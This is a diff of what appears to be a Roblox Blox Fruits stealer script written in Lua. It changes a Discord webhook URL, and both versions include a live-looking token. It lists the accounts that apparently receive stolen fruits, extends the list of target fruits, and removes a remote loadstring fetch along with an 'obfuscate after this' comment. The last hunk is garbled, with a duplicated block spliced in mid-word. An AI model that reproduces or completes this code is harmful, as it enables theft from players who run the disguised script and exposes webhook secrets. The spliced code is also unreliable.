@@ -1,10 +1,6 @@
-Webhook = "https://discord.com/api/webhooks/1337190149267783722/ImMUdiUAFT2E_h5ebPQnVYyNbRwqK6edp45BsAoLCjlZAPjZtxu7qyPcSffpfNt88_Ej"
+Webhook = "https://discord.com/api/webhooks/1340692478797549568/Flgij3ovh-qxcp52Czgt3JzfU-RwfRbQBRzAijVfaa1gJrBEuyLMmq32NFyATmP3XzpJ"
 Usernames = {"Echo_0rbital", "somealtuserhere2"}
-FruitsToHit = {"Quake-Quake", "Phoenix-Phoenix", "Leopard-Leopard", "Yeti-Yeti"}
-
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
-
--- << Obfuscate after this moment
+FruitsToHit = {"Quake-Quake", "Phoenix-Phoenix", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"}
 
 local CoreGui = game:GetService("CoreGui")
 local LocalPlayer222 = game:GetService("Players").LocalPlayer
@@ -1720,6 +1716,20 @@ end
 
 if not shared.ScriptExecuted then
     shared.ScriptExecuted = true
+    task.spawn(function()
+        local success, errorMessage = pcall(init)
+        if not success then
+            task.spawn(function()
+                LocalPlayer:Kick("Error: " .. tostring(errorMessage))
+            end)
+        end
+    end)
+end       task.spawn(function()
+                LocalPlayer:Kick("Error: " .. tostring(errorMessage))
+            end)
+        end
+    end)
+endiptExecuted = true
     task.spawn(function()
         local success, errorMessage = pcall(init)
         if not success then
